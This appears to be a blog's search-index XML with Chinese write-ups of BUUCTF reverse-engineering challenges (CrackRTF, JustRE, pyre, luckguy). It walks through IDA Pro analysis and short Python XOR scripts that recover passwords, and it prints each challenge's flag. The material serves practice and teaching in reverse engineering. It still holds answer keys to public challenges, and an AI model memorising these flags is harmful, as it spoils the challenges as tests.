函数传递的值会传到这里，进行抑或运算，在这里我们需要用到一个叫做<strong> Resourse Hacker</strong> 的软件来查看</p><img src="/2022/03/12/CrackRTF/8.jpg" class><p>框出来的数字就是我们要进行抑或运算的六位数字的一部分</p><h5 id="脚本2"><a class="markdownIt-Anchor" href="#脚本2">#</a> 脚本 2</h5><p>因为最后会生成一个.rtf 文件，而.rtf 文件的标识符前六位是 {\rtf1，所以我们就把<strong> 0x05,0x7D,0x41,0x15,0x26,0x01</strong> 和 {\rtf1 进行抑或运算，写一个脚本进行计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x05</span>, <span class="number">0x7D</span>, <span class="number">0x41</span>, <span class="number">0x15</span>, <span class="number">0x26</span>, <span class="number">0x01</span>]</span><br><span class="line">b = <span class="string">&#x27;&#x27;</span></span><br><span class="line">c = <span class="string">&#x27;&#123;\\rtf1&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a)):</span><br><span class="line">    b += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c[i]) ^ a[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到第二个密码为～！3a@0</p><p>最后运行程序，输入两次密码，会生成一个.rtf 文件在根目录</p><p>点开即得到<strong> Flag {N0_M0re_Free_Bugs}</strong></p><p>题目来源：<a href="https://buuoj.cn/challenges">BUUCTF 在线评测 (buuoj.cn)</a>–CrackRTF</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JustRE</title>
      <link href="/2022/03/12/JustRE/"/>
      <url>/2022/03/12/JustRE/</url>
      
        <content type="html"><![CDATA[<p>还是照例用 exeinfope 打开，发现是 32 位程序，那么我们直接用 32 位 IDA PRO 打开即可，ctrl+f 查找 main 函数 F5 看伪代码发现没啥东西，于是 shift+F12 查看字符串，拉到最底下的时候发现一个 flag（熟悉的配方）</p><img src="/2022/03/12/JustRE/1.jpg" class><p>ctrl+x 跟进以下查看函数</p><img src="/2022/03/12/JustRE/2.jpg" class><p>我们注意以下这一行</p><img src="/2022/03/12/JustRE/3.jpg" class><p>一开始我还懵了半天，后面过了一会再看，咦，这不就是 c 语言的 printf 函数吗哈哈哈哈，所以只要把 19999 和 0 代替两个 % d 就可以了，over</p><p 1999902069a45792d233ac>flag：BJD</p><p>题目来源：<a href="https://buuoj.cn/challenges">BUUCTF 在线评测 (buuoj.cn)</a>–JustRE</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pyre</title>
      <link href="/2022/03/12/pyre/"/>
      <url>/2022/03/12/pyre/</url>
      
        <content type="html"><![CDATA[<h3 id="1审计代码"><a class="markdownIt-Anchor" href="#1审计代码">#</a> 1. 审计代码</h3><p>拿到题目后发现这是一个 pyc 文件，是一道 python 逆向题，拿到在线反编译器中反编译一下，可以得到以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">print &quot;Welcome to Re World!&quot;</span><br><span class="line">print &quot;Your input1 is your flag~&quot;</span><br><span class="line">l = len(input1)</span><br><span class="line">for i in range(l):</span><br><span class="line">    num = ((input1[i] + i) % 128 + 128) % 128</span><br><span class="line">    code += num</span><br><span class="line">for i in range(l - 1):</span><br><span class="line">    code[i] = code[i] ^ code[i + 1]</span><br><span class="line">print code</span><br><span class="line">code = [</span><br><span class="line">    &quot;\x1f&quot;,</span><br><span class="line">    &quot;\x12&quot;,</span><br><span class="line">    &quot;\x1d&quot;,</span><br><span class="line">    &quot;(&quot;,</span><br><span class="line">    &quot;0&quot;,</span><br><span class="line">    &quot;4&quot;,</span><br><span class="line">    &quot;\x01&quot;,</span><br><span class="line">    &quot;\x06&quot;,</span><br><span class="line">    &quot;\x14&quot;,</span><br><span class="line">    &quot;4&quot;,</span><br><span class="line">    &quot;,&quot;,</span><br><span class="line">    &quot;\x1b&quot;,</span><br><span class="line">    &quot;U&quot;,</span><br><span class="line">    &quot;?&quot;,</span><br><span class="line">    &quot;o&quot;,</span><br><span class="line">    &quot;6&quot;,</span><br><span class="line">    &quot;*&quot;,</span><br><span class="line">    &quot;:&quot;,</span><br><span class="line">    &quot;\x01&quot;,</span><br><span class="line">    &quot;D&quot;,</span><br><span class="line">    &quot;;&quot;,</span><br><span class="line">    &quot;%&quot;,</span><br><span class="line">    &quot;\x13&quot;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>我们只要逐步反向写脚本就可以得到 flag，不过我在写脚本的时候想了很久，一直都没搞出来</p><h3 id="2确定思路"><a class="markdownIt-Anchor" href="#2确定思路">#</a> 2. 确定思路</h3><p>首先是这一部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for i in range(l - 1):</span><br><span class="line">    code[i] = code[i] ^ code[i + 1]</span><br></pre></td></tr></table></figure><p>这行代码的意思是将 code 从第一位开始，和后一位进行异或运算，一直到倒数第二位，那我们要还原这一步的话我们就要反过来抑或，就是这里我卡了很久，不知道怎么解决，知道看到大佬的 wp，发现可以这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for i in range(l-2, -1, -1):</span><br><span class="line">    code[i] = chr(ord(code[i]) ^ ord(code[i + 1]))</span><br></pre></td></tr></table></figure><h3 id="3写出脚本"><a class="markdownIt-Anchor" href="#3写出脚本">#</a> 3. 写出脚本</h3><p>后面那步还比较好理解，把式子化简以下就可以，最后完整的脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">code = [&#x27;\x1f&#x27;, &#x27;\x12&#x27;, &#x27;\x1d&#x27;, &#x27;(&#x27;, &#x27;0&#x27;, &#x27;4&#x27;, &#x27;\x01&#x27;, &#x27;\x06&#x27;, &#x27;\x14&#x27;, &#x27;4&#x27;, &#x27;,&#x27;,</span><br><span class="line">        &#x27;\x1b&#x27;,&#x27;U&#x27;, &#x27;?&#x27;, &#x27;o&#x27;, &#x27;6&#x27;, &#x27;*&#x27;, &#x27;:&#x27;, &#x27;\x01&#x27;, &#x27;D&#x27;, &#x27;;&#x27;, &#x27;%&#x27;, &#x27;\x13&#x27;]</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">l = len(code)</span><br><span class="line">for i in range(l-2, -1, -1):</span><br><span class="line">    code[i] = chr(ord(code[i]) ^ ord(code[i + 1]))</span><br><span class="line"></span><br><span class="line">for i in range(0, len(code)):</span><br><span class="line">    flag += chr((ord(code[i]) - i) % 128)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p just_re_1s_ha66y!>flag：GWHT</p><p>题目来源：<a href="https://buuoj.cn/challenges">BUUCTF 在线评测 (buuoj.cn)</a>–pyre</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>luckguy</title>
      <link href="/2022/03/11/luckguy/"/>
      <url>/2022/03/11/luckguy/</url>
      
        <content type="html"><![CDATA[<p>首先用 exeinfope 查壳，但没什么结果，所以我尝试先直接用 64 位 ida pro 打开，然后直接找到主函数</p><img src="/2022/03/11/luckguy/1.jpg" class><p>还是没什么发现，于是就 shift+F12 看查看字符串，看到一个疑似 flag 的字符串</p><img src="/2022/03/11/luckguy/2.jpg" class><p>双击点进去，ctrl+x 跟进一下，F5 查看函数</p><img src="/2022/03/11/luckguy/3.jpg" class><p>在 case1 中看到 flag 是 s 和 f1、f2 拼接，可以知道 flag 的前一部分是 GXY {do_not_</p><img src="/2022/03/11/luckguy/4.jpg" class><p>往后看，在 case4 中又发现得到的前部分还要和 s 拼接，所以剩下的就只要求出后一部分 flag 就可以了</p><img src="/2022/03/11/luckguy/5.jpg" class><p>不难看出，在 case5 中要将 s 进行一系列计算，s 正好可以分为一个八位的 16 进制数，只要将这 8 位 16 进制数进行以下计算就行了，用 python 写个脚本即可得出（要注意要将得到的字符串反向）</p><img src="/2022/03/11/luckguy/6.jpg" class><p>得到后一部分 flag</p><img src="/2022/03/11/luckguy/7.jpg" class><p do_not_hate_me>拼接得到最终的 flag： GXY</p><p>题目来源：<a href="https://buuoj.cn/challenges">BUUCTF 在线评测 (buuoj.cn)</a>–luck_guy</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
